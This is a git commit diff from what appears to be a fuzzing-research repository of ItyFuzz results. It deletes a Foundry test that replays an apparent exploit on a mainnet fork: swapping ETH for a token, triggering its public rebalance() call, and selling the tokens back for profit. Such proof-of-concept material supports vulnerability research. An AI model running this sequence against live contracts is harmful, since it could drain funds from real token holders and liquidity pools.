864998647a630d5abc39e45e0f6270740cd479ec
Trung Nguyen <duc.nguyen@check24.de>
2023-12-09 21:14:44 +0100

    update

--- automated_ityfuzz/results/EVM/EVM_earlier_block/OlympusDao/vulnerabilities/Ca29e.t.sol
+++ automated_ityfuzz/results/EVM/EVM_earlier_block/OlympusDao/vulnerabilities/Ca29e.t.sol
@@ -26,45 +26,9 @@ Earned 8907083787485861186428537308360608296405383435818504926112121639515153900
 
  */
 
-contract Ca29e is Test {
-    function setUp() public {
-        vm.createSelectFork("eth", 15791484);
-    }
 
-    function test() public {
-        address router = 0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D;
-        address weth = 0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2;
-        
-        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
-        address[] memory path0 = new address[](2);
-        path0[0] = weth;
-        path0[1] = 0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76;
-        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, 287724344996224149542146992);
-        IUniswapV2Router(router).swapExactETHForTokensSupportingFeeOnTransferTokens{
-            value: 287724344996224149542146992
-        }(0, path0, address(this), block.timestamp);
-        
-        vm.prank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
-        
-        0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76.call(abi.encodeWithSignature(
-            "rebalance()"
-        )); 
-        vm.startPrank(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd);
-        uint256 amount0 = IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76).balanceOf(address(this));
-        IERC20(0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76).approve(router, amount0);
-        address[] memory liq_path0 = new address[](2);
-        liq_path0[0] = 0x56de8BC61346321D4F2211e3aC3c0A7F00dB9b76;
-        liq_path0[1] = address(weth);
-        vm.deal(0x8EF508Aca04B32Ff3ba5003177cb18BfA6Cd79dd, amount0);
-        IUniswapV2Router(router).swapExactTokensForETHSupportingFeeOnTransferTokens(
-            amount0, 0, liq_path0, address(this), block.timestamp
-        );
-        vm.stopPrank();
-    }
 
-    // Stepping with return
-    receive() external payable {}
-}
+
 
 interface IERC20 {
     function balanceOf(address owner) external view returns (uint256);
